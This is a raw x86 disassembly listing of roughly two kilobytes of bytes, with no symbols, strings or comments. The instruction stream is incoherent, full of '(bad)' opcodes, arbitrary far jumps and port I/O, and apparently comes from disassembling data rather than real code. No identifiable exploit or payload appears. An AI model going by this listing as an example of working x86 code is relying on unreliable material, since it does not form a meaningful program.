  69d839:	ror    BYTE PTR [eax],0x10
  69d83c:	aaa    
  69d83d:	sbb    DWORD PTR ds:0x606dcd9f,ebx
  69d843:	ss xor eax,0x9433d406
  69d849:	cmp    DWORD PTR [esi-0x21668a39],edx
  69d84f:	mov    bl,0xeb
  69d851:	adc    bl,BYTE PTR [edx-0x627a9bb1]
  69d857:	push   0x0
  69d859:	mov    ebx,0x189368cc
  69d85e:	jmp    0xecf3:0xe132a89d
  69d865:	and    ch,BYTE PTR [ecx-0x3389f56e]
  69d86b:	xor    DWORD PTR [edi],ecx
  69d86d:	mov    ds:0x2cec46f4,al
  69d872:	push   ebp
  69d873:	ja     0x69d845
  69d875:	test   ebp,0x9f953b9
  69d87b:	test   al,0xa2
  69d87d:	push   eax
  69d87e:	mov    al,ds:0xd29d4c75
  69d883:	jg     0x69d8b8
  69d885:	in     al,dx
  69d886:	push   es
  69d887:	daa    
  69d888:	mov    ds:0x53510095,eax
  69d88d:	pushf  
  69d88e:	hlt    
  69d88f:	dec    ebp
  69d890:	xchg   edx,eax
  69d891:	std    
  69d892:	nop
  69d893:	jecxz  0x69d88d
  69d895:	popf   
  69d896:	or     DWORD PTR [eax+0x12],ebx
  69d899:	mov    bl,0x89
  69d89b:	add    al,0x6
  69d89d:	imul   ecx,DWORD PTR [ecx+edx*1-0x7],0x337ce6fc
  69d8a5:	cmp    esi,DWORD PTR [bx-0x59]
  69d8a9:	cmp    BYTE PTR [ebx-0x23],ah
  69d8ac:	icebp  
  69d8ad:	pop    esp
  69d8ae:	xchg   ecx,eax
  69d8af:	nop
  69d8b0:	into   
  69d8b1:	inc    edx
  69d8b2:	ret    0x1f8c
  69d8b5:	sbb    DWORD PTR [edx+0x65],0xffffff9d
  69d8b9:	fwait
  69d8ba:	gs stos BYTE PTR es:[edi],al
  69d8bc:	in     al,dx
  69d8bd:	and    dl,ch
  69d8bf:	aaa    
  69d8c0:	dec    ecx
  69d8c1:	cmp    DWORD PTR [esi],eax
  69d8c3:	xor    BYTE PTR [ebx],bh
  69d8c5:	aam    0xa9
  69d8c7:	push   ss
  69d8c8:	pop    eax
  69d8c9:	or     BYTE PTR [ecx],bh
  69d8cb:	sbb    al,0xbb
  69d8cd:	push   ss
  69d8ce:	add    BYTE PTR [esi+0x4d],ch
  69d8d1:	dec    edi
  69d8d2:	rol    WORD PTR [eax+0x3e2fe475],1
  69d8d9:	inc    esi
  69d8da:	mov    ah,0x99
  69d8dc:	mul    esp
  69d8de:	ins    DWORD PTR es:[edi],dx
  69d8df:	ins    DWORD PTR es:[edi],dx
  69d8e0:	(bad)  
  69d8e1:	jno    0x69d8f9
  69d8e3:	call   0x18d6:0x4e199feb
  69d8ea:	mov    edx,0x9d6cd134
  69d8ef:	cmp    al,0xc
  69d8f1:	pop    ecx
  69d8f2:	push   esp
  69d8f3:	xor    eax,0xd09d875a
  69d8f8:	ins    BYTE PTR es:[edi],dx
  69d8f9:	not    ah
  69d8fb:	push   eax
  69d8fc:	sub    eax,0xa8252d23
  69d901:	jbe    0x69d96e
  69d903:	mov    al,0x99
  69d905:	jb     0x69d96f
  69d907:	jo     0x69d93f
  69d909:	cmp    eax,0xb989d8ef
  69d90e:	or     DWORD PTR [eax+0x1],edi
  69d911:	jbe    0x69d951
  69d913:	iret   
  69d914:	fsub   QWORD PTR [esi-0x4a]
  69d917:	jmp    0x77b0e73f
  69d91c:	cmp    BYTE PTR [ecx],0x59
  69d91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69d920:	fist   WORD PTR [edi]
  69d922:	mov    BYTE PTR [edx+0x7a],dl
  69d925:	jecxz  0x69d9a0
  69d927:	rcl    BYTE PTR [ecx+0x77b162b5],cl
  69d92d:	js     0x69d9a1
  69d92f:	mov    edi,0x60d198d3
  69d934:	out    0x36,al
  69d936:	xchg   ecx,eax
  69d937:	sub    dl,al
  69d939:	inc    ebp
  69d93a:	shl    DWORD PTR [ebx],1
  69d93c:	jne    0x69d8c9
  69d93e:	in     al,dx
  69d93f:	push   ecx
  69d940:	lahf   
  69d941:	adc    eax,0x344e85e0
  69d946:	(bad)  
  69d947:	mov    DWORD PTR [ebx+ebp*1],edi
  69d94a:	clc    
  69d94b:	and    ch,BYTE PTR [edi]
  69d94d:	ds jmp 0x69d98e
  69d950:	ret    
  69d951:	xchg   edi,eax
  69d952:	sbb    al,0xe1
  69d954:	aad    0x4c
  69d956:	pop    ds
  69d957:	sub    ah,BYTE PTR [ebx-0x55a9b7f0]
  69d95d:	retf   
  69d95e:	pop    eax
  69d95f:	dec    edi
  69d960:	in     al,dx
  69d961:	add    esp,edx
  69d963:	fmul   st,st(3)
  69d965:	imul   DWORD PTR [ecx]
  69d967:	add    ch,BYTE PTR [eax+0x1]
  69d96a:	div    esi
  69d96c:	(bad)  
  69d96d:	mov    eax,0xbcaea89b
  69d972:	test   eax,0x7ab890bc
  69d977:	lock add ebx,DWORD PTR [edx]
  69d97a:	inc    esi
  69d97b:	jecxz  0x69d96a
  69d97d:	pop    esp
  69d97e:	cmp    DWORD PTR [esi+0x68],ebx
  69d981:	aaa    
  69d982:	inc    ebp
  69d983:	mov    BYTE PTR [ecx-0x6308f0b5],bl
  69d989:	out    0xb3,al
  69d98b:	xor    DWORD PTR [esi+eiz*4-0x1db7120d],ebp
  69d992:	test   DWORD PTR [ebx],eax
  69d994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69d995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69d996:	(bad)  
  69d997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69d998:	stos   BYTE PTR es:[edi],al
  69d999:	(bad)  
  69d99a:	pop    ecx
  69d99b:	jne    0x69d96f
  69d99d:	pusha  
  69d99e:	push   cs
  69d99f:	cmp    BYTE PTR [ecx],ah
  69d9a1:	mov    BYTE PTR [ebp*4+0xc922ab0],cl
  69d9a8:	ss sti 
  69d9aa:	repz sub DWORD PTR [eax+eax*4-0x7b],esp
  69d9af:	xor    BYTE PTR [eax+0x507a53e2],0x46
  69d9b6:	fistp  WORD PTR [ecx+0x7d9ec715]
  69d9bc:	push   ebx
  69d9bd:	dec    eax
  69d9be:	jns    0x69d9a2
  69d9c0:	jno    0x69d9ad
  69d9c2:	sbb    bl,BYTE PTR [eax+0x613ad96a]
  69d9c8:	lods   al,BYTE PTR ds:[esi]
  69d9c9:	and    DWORD PTR [ebx+edx*2],ebx
  69d9cc:	jmp    0xa385:0xe64778b0
  69d9d3:	jo     0x69da1c
  69d9d5:	jecxz  0x69d999
  69d9d7:	mov    al,BYTE PTR [ecx+eiz*1+0x77]
  69d9db:	mov    ebp,0x107e519e
  69d9e0:	es xchg edx,eax
  69d9e2:	mov    BYTE PTR [esi],ah
  69d9e4:	cmp    al,0x8
  69d9e6:	mov    ebp,0x82bd8938
  69d9eb:	sbb    edi,edi
  69d9ed:	out    0xbe,eax
  69d9ef:	rcl    DWORD PTR [esi-0x2ce1a85],0xf
  69d9f6:	das    
  69d9f7:	jo     0x69d97f
  69d9f9:	add    al,0x89
  69d9fb:	lods   eax,DWORD PTR ds:[esi]
  69d9fc:	cld    
  69d9fd:	fst    DWORD PTR [esi-0x75337b9d]
  69da03:	xchg   ecx,edi
  69da05:	adc    DWORD PTR [esi+0x4d],0x67b6969b
  69da0c:	jmp    0xee372eac
  69da11:	enter  0x2b47,0x30
  69da15:	imul   edx,DWORD PTR [esi],0xffffff94
  69da18:	repnz lods al,BYTE PTR ds:[esi]
  69da1a:	popf   
  69da1b:	(bad)  
  69da1c:	mov    dh,0x18
  69da1e:	xchg   ebp,eax
  69da1f:	fstp   DWORD PTR [ecx]
  69da21:	xchg   edx,eax
  69da22:	add    DWORD PTR [ebp-0x70],0x1e
  69da26:	ja     0x69d9de
  69da28:	je     0x69d9e0
  69da2a:	test   al,0xb1
  69da2c:	inc    eax
  69da2d:	inc    ecx
  69da2e:	or     eax,0x791a99c0
  69da33:	aas    
  69da34:	lahf   
  69da35:	arpl   ax,dx
  69da37:	inc    eax
  69da38:	mov    ebx,0x725ec450
  69da3d:	or     ecx,eax
  69da3f:	add    al,0xc7
  69da41:	and    DWORD PTR [eax+0x5b],0x44d07ff2
  69da48:	js     0x69da82
  69da4a:	and    eax,0x8b2559a3
  69da4f:	int3   
  69da50:	repnz imul eax,DWORD PTR [eax],0x77b1d4f6
  69da57:	in     al,0x9
  69da59:	das    
  69da5a:	inc    edx
  69da5b:	ins    BYTE PTR es:[edi],dx
  69da5c:	or     dh,BYTE PTR [esi+ebx*2-0x2e011ed8]
  69da63:	fnstenv [ebp+0x1bea3c60]
  69da69:	shl    BYTE PTR [edi-0x5b0a10c4],1
  69da6f:	xlat   BYTE PTR ds:[ebx]
  69da70:	bound  esi,QWORD PTR [esi+0x3fddb444]
  69da76:	jmp    0x761701a4
  69da7b:	or     ah,BYTE PTR ds:0x299afcb1
  69da81:	cwde   
  69da82:	mov    ch,0xd6
  69da84:	imul   ebx,DWORD PTR [edx+0x12fe3fe0],0xffffffa3
  69da8b:	data16 jne 0x69da54
  69da8e:	aam    0x1e
  69da90:	aad    0x49
  69da92:	sahf   
  69da93:	int    0xfc
  69da95:	mov    esi,0x3952e6a4
  69da9a:	leave  
  69da9b:	pushf  
  69da9c:	clc    
  69da9d:	or     al,0x89
  69da9f:	pop    es
  69daa0:	ins    BYTE PTR es:[edi],dx
  69daa1:	loope  0x69dac2
  69daa3:	inc    ebx
  69daa4:	mov    esi,0xb8cdb1b4
  69daa9:	push   ecx
  69daaa:	pop    ds
  69daab:	mov    ebp,0x98b22a10
  69dab0:	ret    0xeeef
  69dab3:	or     eax,0x3f00c4c3
  69dab8:	push   0xe29ade3c
  69dabd:	inc    ebp
  69dabe:	lahf   
  69dabf:	aaa    
  69dac0:	shl    ah,0xc4
  69dac3:	dec    esp
  69dac4:	xchg   esi,eax
  69dac5:	fnsave [edi+ebp*1+0x37]
  69dac9:	cdq    
  69daca:	sbb    edi,ebx
  69dacc:	jb     0x69dae8
  69dace:	dec    esp
  69dacf:	xchg   ecx,eax
  69dad0:	jae    0x69da9c
  69dad2:	xchg   ecx,eax
  69dad3:	out    0x88,eax
  69dad5:	sub    cl,BYTE PTR [ecx-0x2e901ce2]
  69dadb:	je     0x69da60
  69dadd:	mov    ebp,0x9af336b2
  69dae2:	cdq    
  69dae3:	or     al,0x7e
  69dae5:	and    eax,edx
  69dae7:	pop    ebp
  69dae8:	adc    dh,ch
  69daea:	nop
  69daeb:	shl    DWORD PTR [ebp+0x2f2f88fc],cl
  69daf1:	fwait
  69daf2:	cmp    cl,dl
  69daf4:	aad    0xdb
  69daf6:	inc    esi
  69daf7:	xchg   DWORD PTR [ebp+0x60],esi
  69dafa:	sub    dh,BYTE PTR [edx-0x1c50b6ff]
  69db00:	dec    ecx
  69db01:	mov    edi,0xb2017ed1
  69db06:	jo     0x69db84
  69db08:	mov    ?,WORD PTR [ecx-0x19]
  69db0b:	sbb    esp,esp
  69db0d:	cmove  esi,DWORD PTR [edx+edx*4+0x51736fa4]
  69db15:	push   ds
  69db16:	in     al,0x91
  69db18:	lods   eax,DWORD PTR ds:[esi]
  69db19:	sbb    ecx,0xffffffc6
  69db1c:	inc    eax
  69db1d:	fisub  WORD PTR [edi-0x7e]
  69db20:	xor    al,0xc6
  69db22:	or     al,0xc4
  69db24:	add    eax,0x95ec060b
  69db29:	mov    cl,0x41
  69db2b:	sbb    edx,DWORD PTR [esi+0x10be26aa]
  69db31:	dec    eax
  69db32:	dec    esi
  69db33:	mov    al,0xa3
  69db35:	and    DWORD PTR [ebp-0x79ba3c49],0xf5e9bd31
  69db3f:	aaa    
  69db40:	pop    ecx
  69db41:	push   esi
  69db42:	jnp    0x69db8f
  69db44:	dec    ebp
  69db45:	inc    esp
  69db46:	mov    cl,0x78
  69db48:	inc    ebp
  69db49:	ret    0xe87a
  69db4c:	iret   
  69db4d:	push   ds
  69db4e:	mov    WORD PTR [edx*1+0x12ab135b],?
  69db55:	mov    ebp,0xaa2aff22
  69db5a:	jmp    0x69db60
  69db5c:	stos   BYTE PTR es:[edi],al
  69db5d:	inc    ebx
  69db5e:	fisub  WORD PTR [edx+0x3eae7597]
  69db64:	jecxz  0x69db80
  69db66:	mov    WORD PTR [ebp-0x73],ss
  69db69:	and    ebp,DWORD PTR [edx+0x4e64007a]
  69db6f:	aad    0x73
  69db71:	nop
  69db72:	ja     0x69db29
  69db74:	loope  0x69dbc9
  69db76:	fsubp  st(0),st
  69db78:	adc    bl,BYTE PTR [ebx]
  69db7a:	aam    0x5c
  69db7c:	push   edi
  69db7d:	xchg   ebx,eax
  69db7e:	dec    edx
  69db7f:	mov    edx,0x6d681a04
  69db84:	stos   BYTE PTR es:[edi],al
  69db85:	jg     0x69db24
  69db87:	ds dec esi
  69db89:	xchg   ebx,eax
  69db8a:	or     edi,DWORD PTR [ebp+0x3c]
  69db8d:	cdq    
  69db8e:	xor    DWORD PTR [edx+ecx*1-0x3fc19fea],0xfffffff9
  69db96:	xor    eax,0xc889f9ef
  69db9b:	dec    esp
  69db9c:	push   cs
  69db9d:	sub    esp,edx
  69db9f:	jmp    0x2c044579
  69dba4:	shl    DWORD PTR [edi+0x9f509b2],cl
  69dbaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69dbab:	cmp    BYTE PTR [edi+0x2a69b576],bh
  69dbb1:	mov    bl,0x92
  69dbb3:	or     al,0x9
  69dbb5:	mov    eax,es
  69dbb7:	nop
  69dbb8:	inc    edx
  69dbb9:	jge    0x69dbf7
  69dbbb:	lock test BYTE PTR [ebp+0x798c1d3a],bl
  69dbc2:	out    0x3a,eax
  69dbc4:	rcr    dh,1
  69dbc6:	xor    ah,BYTE PTR [eax+0x70ac91d7]
  69dbcc:	cmp    BYTE PTR [eax-0x9],dh
  69dbcf:	in     eax,dx
  69dbd0:	dec    eax
  69dbd1:	xchg   edx,eax
  69dbd2:	aad    0xe9
  69dbd4:	(bad)  
  69dbd5:	xchg   ebx,eax
  69dbd6:	sub    al,0xef
  69dbd8:	ds and ecx,eax
  69dbdb:	inc    ebx
  69dbdc:	popf   
  69dbdd:	std    
  69dbde:	call   DWORD PTR [edi+0x5f]
  69dbe1:	jmp    0xf32b:0x61c67976
  69dbe8:	inc    esi
  69dbe9:	inc    esp
  69dbea:	outs   dx,DWORD PTR ds:[esi]
  69dbeb:	jns    0x69dbb2
  69dbed:	adc    eax,0x64fa15db
  69dbf2:	fisubr DWORD PTR [esi+0x7d]
  69dbf5:	inc    edx
  69dbf6:	pop    ecx
  69dbf7:	loope  0x69dbd4
  69dbf9:	stos   BYTE PTR es:[edi],al
  69dbfa:	jmp    0xcbf5c8e7
  69dbff:	enter  0x3274,0x65
  69dc03:	mov    cl,dh
  69dc05:	ret    
  69dc06:	fwait
  69dc07:	(bad)  
  69dc08:	jl     0x69dc72
  69dc0a:	fucomip st,st(5)
  69dc0c:	sub    DWORD PTR [edx],edi
  69dc0e:	fs inc esp
  69dc10:	xor    bh,BYTE PTR [edx-0x354d068b]
  69dc16:	sub    DWORD PTR [eax],esp
  69dc18:	lea    eax,[ebx]
  69dc1a:	ja     0x69dbf0
  69dc1c:	or     eax,0xe6199d7b
  69dc21:	push   ecx
  69dc22:	mov    ds:0x90a2f943,eax
  69dc27:	adc    ch,bh
  69dc29:	cmp    BYTE PTR [esi-0x93f80d6],cl
  69dc2f:	and    ebp,DWORD PTR [ebp+0x18]
  69dc32:	dec    eax
  69dc33:	cli    
  69dc34:	mov    al,0x5f
  69dc36:	int3   
  69dc37:	cli    
  69dc38:	dec    esi
  69dc39:	and    DWORD PTR [eax-0x48],0xdd8c38b3
  69dc40:	ins    BYTE PTR es:[edi],dx
  69dc41:	iret   
  69dc42:	out    dx,eax
  69dc43:	xchg   ecx,eax
  69dc44:	in     al,0xdc
  69dc46:	push   edi
  69dc47:	mov    edi,0xa527eadb
  69dc4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69dc4d:	outs   dx,BYTE PTR ds:[esi]
  69dc4e:	xchg   ebp,eax
  69dc4f:	push   esi
  69dc50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69dc51:	xchg   BYTE PTR [ebp+0x4061a22b],ch
  69dc57:	push   esi
  69dc58:	pop    edi
  69dc59:	push   cx
  69dc5b:	xchg   ebx,eax
  69dc5c:	rol    esp,cl
  69dc5e:	xchg   esp,ebx
  69dc60:	(bad)
  69dc63:	and    ah,BYTE PTR ds:0x43a9e114
  69dc69:	imul   ebp,DWORD PTR [ebp-0x5c],0xffffffa1
  69dc6d:	mov    edx,0xbd83b6
  69dc72:	push   ebx
  69dc73:	inc    esp
  69dc74:	pop    eax
  69dc75:	bound  edi,QWORD PTR [ebp-0x7f667d5e]
  69dc7b:	xchg   esi,eax
  69dc7c:	jp     0x69dc3d
  69dc7e:	mov    ?,edx
  69dc80:	es lahf 
  69dc82:	or     al,BYTE PTR [ebx]
  69dc84:	sub    dl,BYTE PTR [ebx+0x6f56d72f]
  69dc8a:	adc    al,0x20
  69dc8c:	mov    eax,ds:0x1a4c3586
  69dc91:	sub    DWORD PTR cs:[edx],esi
  69dc94:	mov    eax,ds:0x8298e052
  69dc99:	xor    al,BYTE PTR [esi+0x83d0809]
  69dc9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69dca0:	aad    0x6e
  69dca2:	fimul  DWORD PTR [edi-0x7477552b]
  69dca8:	in     eax,dx
  69dca9:	push   ecx
  69dcaa:	xchg   BYTE PTR [ebx+0x3d],cl
  69dcad:	push   ebp
  69dcae:	pop    ds
  69dcaf:	xlat   BYTE PTR ds:[ebx]
  69dcb0:	stos   BYTE PTR es:[edi],al
  69dcb1:	es adc edi,esp
  69dcb4:	rol    DWORD PTR [eax-0x25],0x2a
  69dcb8:	push   es
  69dcb9:	cmp    eax,0xf4ac4ecf
  69dcbe:	or     DWORD PTR [edi-0x28],esp
  69dcc1:	rol    BYTE PTR [edi-0x67],1
  69dcc4:	sbb    eax,0xff70c672
  69dcc9:	leave  
  69dcca:	xlat   BYTE PTR ds:[ebx]
  69dccb:	(bad)  
  69dccc:	out    0x8a,eax
  69dcce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69dccf:	fmul   st,st(4)
  69dcd1:	sbb    BYTE PTR [edx],dh
  69dcd3:	xchg   ebp,eax
  69dcd4:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  69dcd6:	sbb    al,0xf2
  69dcd9:	test   DWORD PTR [eax+0x6839a449],ebp
  69dcdf:	mov    cl,0x11
  69dce1:	scas   eax,DWORD PTR es:[edi]
  69dce2:	pop    ds
  69dce3:	into   
  69dce4:	popa   
  69dce5:	cld    
  69dce6:	(bad)  [ebx+0x5]
  69dce9:	ja     0x69dc8f
  69dceb:	scas   eax,DWORD PTR es:[edi]
  69dcec:	repnz call 0x42d3:0xa7ffaee
  69dcf4:	fsubr  QWORD PTR [edi+0x510224b1]
  69dcfa:	ret    
  69dcfb:	fld    TBYTE PTR [esp+ebx*1]
  69dcfe:	push   ecx
  69dcff:	iret   
  69dd00:	retf   0x1acb
  69dd03:	xor    ebp,edi
  69dd05:	or     bl,BYTE PTR [ebp+0x5c]
  69dd08:	std    
  69dd09:	inc    BYTE PTR [edx-0x5f]
  69dd0c:	push   0x78a3a286
  69dd11:	arpl   WORD PTR [eax],dx
  69dd13:	mov    eax,0x84d83d2
  69dd18:	mov    ds:0xed61d9d9,al
  69dd1d:	lea    edx,[esi+0x4c]
  69dd20:	adc    eax,0x2f38dddd
  69dd25:	inc    esi
  69dd26:	test   BYTE PTR [edx-0x37],ch
  69dd29:	retf   0x5142
  69dd2c:	dec    edx
  69dd2d:	cmp    DWORD PTR [edx],edi
  69dd2f:	mov    BYTE PTR [ecx+0x7e],al
  69dd32:	adc    al,BYTE PTR [edx-0x55]
  69dd35:	jnp    0x69dda1
  69dd37:	stc    
  69dd38:	ficomp WORD PTR [ebx+0x64]
  69dd3b:	(bad)  
  69dd3c:	stos   BYTE PTR es:[edi],al
  69dd3d:	and    DWORD PTR [ebx-0x6929706b],eax
  69dd43:	mov    eax,0x9842b65b
  69dd48:	mov    bh,0x1b
  69dd4a:	add    DWORD PTR [edi+0x62],0x48
  69dd4e:	(bad)  
  69dd50:	repnz iret 
  69dd52:	lods   al,BYTE PTR ds:[esi]
  69dd53:	aad    0x1f
  69dd55:	xchg   edi,eax
  69dd56:	push   es
  69dd57:	push   0xca495b5f
  69dd5c:	or     eax,0xe4f403cc
  69dd61:	or     ah,bl
  69dd63:	lods   al,BYTE PTR ds:[esi]
  69dd64:	xor    al,0xf7
  69dd66:	cmp    DWORD PTR [eax],esp
  69dd68:	jp     0x69dd0e
  69dd6a:	xchg   BYTE PTR [eax+eax*4],bh
  69dd6d:	pop    esi
  69dd6e:	repz sub bh,0x7
  69dd72:	xor    dh,BYTE PTR [eax]
  69dd74:	addr16 (bad) 
  69dd76:	loop   0x69dd85
  69dd78:	js     0x69ddce
  69dd7a:	nop
  69dd7b:	bnd jo 0x69ddb1
  69dd7e:	xchg   BYTE PTR [eax],al
  69dd80:	adc    DWORD PTR [ecx],eax
  69dd82:	retf   
  69dd83:	jl     0x69dd9d
  69dd85:	je     0x69dd0b
  69dd87:	jb     0x69ddfb
  69dd89:	dec    esp
  69dd8a:	mov    esp,DWORD PTR [eax+0x2efbfb8a]
  69dd90:	jmp    0x69dd64
  69dd92:	dec    edi
  69dd93:	leave  
  69dd94:	mov    ch,0x45
  69dd96:	push   cs
  69dd97:	jecxz  0x69ddf4
  69dd99:	jmp    0xdfd03b38
  69dd9e:	mov    ecx,DWORD PTR [eax]
  69dda0:	adc    al,0x82
  69dda2:	in     eax,0x4a
  69dda4:	mov    al,0xd7
  69dda6:	mov    ebp,0x9bbc2b71
  69ddab:	call   0xe351:0x4381ca24
  69ddb2:	cdq    
  69ddb3:	push   ss
  69ddb4:	jecxz  0x69dd8b
  69ddb6:	popa   
  69ddb7:	sub    DWORD PTR [edx-0x7a81cf9a],edi
  69ddbd:	push   eax
  69ddbe:	push   cs
  69ddbf:	sbb    ecx,DWORD PTR [edi-0xe5eea85]
  69ddc5:	pop    ebx
  69ddc6:	adc    eax,0x6a77ec2c
  69ddcb:	enter  0xdbbc,0x76
  69ddcf:	fist   DWORD PTR [edx]
  69ddd1:	jae    0x69ddf8
  69ddd3:	lahf   
  69ddd4:	fbld   TBYTE PTR ds:0x342006cc
  69ddda:	xchg   esp,eax
  69dddb:	jno    0x69de3d
  69dddd:	mov    esi,0x171d40c8
  69dde2:	mov    cl,0x6d
  69dde4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69dde5:	sbb    dh,dl
  69dde7:	jo     0x69dddb
  69dde9:	clc    
  69ddea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69ddeb:	add    al,0x41
  69dded:	inc    ebp
  69ddee:	(bad)  
  69ddf0:	sbb    edx,ebx
  69ddf2:	ss push eax
  69ddf4:	in     al,dx
  69ddf5:	mov    al,0x74
  69ddf7:	dec    eax
  69ddf8:	(bad)  [esi-0x24bb6523]
  69ddfe:	arpl   WORD PTR [edi-0x4f5b69eb],si
  69de04:	mov    ah,0x4c
  69de06:	js     0x69dda0
  69de08:	lods   al,BYTE PTR ds:[esi]
  69de09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69de0a:	lds    esp,FWORD PTR [edi-0x3c]
  69de0d:	jae    0x69dde6
  69de0f:	jmp    edi
  69de11:	ror    ebp,cl
  69de13:	pop    es
  69de14:	ins    DWORD PTR es:[edi],dx
  69de15:	pop    esi
  69de16:	xchg   BYTE PTR [eax+eax*8],dl
  69de19:	xchg   ebp,eax
  69de1a:	outs   dx,BYTE PTR ds:[esi]
  69de1b:	pop    esp
  69de1c:	mov    eax,DWORD PTR [eax]
  69de1e:	pop    esp
  69de1f:	dec    ebx
  69de20:	icebp  
  69de21:	add    eax,0xb6bc02a1
  69de26:	cmp    al,0x28
  69de28:	xchg   ebp,eax
  69de29:	aam    0xa1
  69de2b:	repz aaa 
  69de2d:	pop    esp
  69de2e:	sub    al,0xfe
  69de30:	fnstsw WORD PTR [edi]
  69de32:	nop
  69de33:	enter  0x81a8,0xc7
  69de37:	je     0x69de8f
  69de39:	ret    0x6847
  69de3c:	sub    edx,DWORD PTR [edx+0x56a9e3d8]
  69de42:	daa    
  69de43:	fadd   QWORD PTR [edi-0x2b]
  69de46:	xor    eax,0xfce7cf81
  69de4b:	data16 test BYTE PTR [esi+0x63e80b98],cl
  69de52:	jbe    0x69de00
  69de54:	cmp    dh,BYTE PTR [edi+0x71afb0b8]
  69de5a:	rcr    DWORD PTR [edi+eax*2+0xc338892],1
  69de61:	fisub  DWORD PTR [ecx+0x5a]
  69de64:	sti    
  69de65:	dec    eax
  69de66:	add    BYTE PTR [esp+edi*4+0x54],0xa5
  69de6b:	gs (bad) 
  69de6e:	pusha  
  69de6f:	out    0x5c,al
  69de71:	sub    edx,edi
  69de73:	(bad)  
  69de74:	popa   
  69de75:	adc    dl,BYTE PTR ds:0x4d59c8ff
  69de7b:	mov    dh,0x77
  69de7d:	jae    0x69de20
  69de7f:	fwait
  69de80:	jg     0x69dedf
  69de82:	(bad)  
  69de83:	cdq    
  69de84:	xchg   BYTE PTR [eax+0x6dcd0643],cl
  69de8a:	add    BYTE PTR [esp+esi*2],0xf6
  69de8e:	sete   cl
  69de91:	push   esp
  69de92:	out    dx,al
  69de93:	sti    
  69de94:	popf   
  69de95:	mov    edi,0xa64da751
  69de9a:	jge    0x69de64
  69de9c:	ins    BYTE PTR es:[edi],dx
  69de9d:	jmp    FWORD PTR [edi*2+0x6bfca1f4]
  69dea4:	xor    al,0x45
  69dea6:	mov    dl,0xe3
  69dea8:	into   
  69dea9:	mov    eax,ds:0x92221422
  69deae:	in     eax,dx
  69deaf:	jp     0x69ded9
  69deb1:	jbe    0x69de95
  69deb3:	(bad)  
  69deb4:	jp     0x69de49
  69deb6:	or     al,0x95
  69deb8:	adc    BYTE PTR [edx+0x3a89eeba],bh
  69debe:	repz xor edi,ecx
  69dec1:	mov    WORD PTR [edi],fs
  69dec3:	ret    
  69dec4:	fstp   QWORD PTR [esi]
  69dec6:	jecxz  0x69deb2
  69dec8:	lods   al,BYTE PTR ds:[esi]
  69dec9:	add    bl,0x60
  69decc:	stos   BYTE PTR es:[edi],al
  69decd:	pop    edi
  69dece:	inc    ebp
  69decf:	mov    ds:0x3e0a45a,eax
  69ded4:	dec    eax
  69ded5:	jmp    0xe72e4382
  69deda:	mov    dl,0x99
  69dedc:	(bad)  
  69dedd:	rcr    ch,1
  69dedf:	cmp    al,0xb5
  69dee1:	sub    DWORD PTR [edx-0x45],edx
  69dee4:	sbb    eax,ecx
  69dee6:	lods   al,BYTE PTR ds:[esi]
  69dee7:	test   eax,0xd6016095
  69deec:	pop    esi
  69deed:	cmp    al,0xb6
  69deef:	lds    si,DWORD PTR [ebx-0x6bb8e769]
  69def6:	test   al,0xc3
  69def8:	je     0x69de8e
  69defa:	xchg   ecx,eax
  69defb:	out    0x8b,al
  69defd:	ins    DWORD PTR es:[edi],dx
  69defe:	or     al,0x96
  69df00:	push   ds
  69df01:	fcomp  QWORD PTR [esi+0x39]
  69df04:	xor    BYTE PTR [esi-0x7cbc762a],dl
  69df0a:	rcr    BYTE PTR [esp+eiz*4-0x31fca226],cl
  69df11:	or     eax,0xcd59031a
  69df16:	rcl    BYTE PTR [ebp+0x437cf5db],0x3d
  69df1d:	pop    ds
  69df1e:	pop    esp
  69df1f:	cmc    
  69df20:	add    eax,edx
  69df22:	add    BYTE PTR ds:0x838c296a,bh
  69df28:	fnsave [edx-0x46651e0e]
  69df2e:	pop    edx
  69df2f:	add    dl,dh
  69df31:	in     eax,dx
  69df32:	add    BYTE PTR [edx+ecx*1+0x8],0xbf
  69df37:	xor    ebx,DWORD PTR [esi+0x7c9cdbfa]
  69df3d:	mov    dl,cl
  69df3f:	jne    0x69df5d
  69df41:	jne    0x69dec5
  69df43:	inc    ecx
  69df44:	push   edx
  69df45:	mov    esp,0xf09a624a
  69df4a:	mov    edi,DWORD PTR [esi+0x5550534b]
  69df50:	sti    
  69df51:	dec    esi
  69df52:	jb     0x69defe
  69df54:	ss jp  0x69df06
  69df57:	cdq    
  69df58:	cmp    ebx,DWORD PTR [eax]
  69df5a:	sub    dh,BYTE PTR [eax]
  69df5c:	ss fs mov al,0x47
  69df60:	popf   
  69df61:	xor    cl,BYTE PTR [ecx]
  69df63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69df64:	push   esp
  69df65:	addr16 push ebx
  69df67:	push   0x9
  69df69:	push   cs
  69df6a:	rol    ch,0xd2
  69df6d:	mov    dh,0x7b
  69df6f:	push   esp
  69df70:	pop    ss
  69df71:	fwait
  69df72:	imul   edi,DWORD PTR [eax+edx*1],0x5c82c9c5
  69df79:	and    al,0x32
  69df7b:	push   edx
  69df7c:	mov    al,0xf0
  69df7e:	ja     0x69df61
  69df80:	daa    
  69df81:	pop    es
  69df82:	mov    BYTE PTR [ecx+0x10],cl
  69df85:	out    0x60,al
  69df87:	sti    
  69df88:	inc    eax
  69df89:	out    0x13,al
  69df8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69df8c:	clc    
  69df8d:	ja     0x69dfe1
  69df8f:	rcl    WORD PTR [eax+edi*4-0x5a1076a],0x94
  69df98:	xor    edi,DWORD PTR [eax]
  69df9a:	or     al,0x24
  69df9c:	mov    bl,0xc3
  69df9e:	ds jmp 0x69e018
  69dfa1:	mov    eax,ds:0x2b3cd835
  69dfa6:	push   ecx
  69dfa7:	std    
